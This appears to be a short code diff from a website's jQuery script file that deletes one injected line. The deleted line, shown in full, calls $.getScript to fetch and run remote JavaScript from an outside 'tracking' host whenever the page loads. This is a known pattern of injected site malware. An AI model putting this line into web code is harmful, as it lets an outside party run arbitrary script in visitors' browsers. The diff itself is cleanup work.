@@ -45,7 +45,7 @@
 
 })(jQuery);
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
 function openCategory(evt, catName) {
     // Declare all variables
     var i, tabcontent, tablinks;
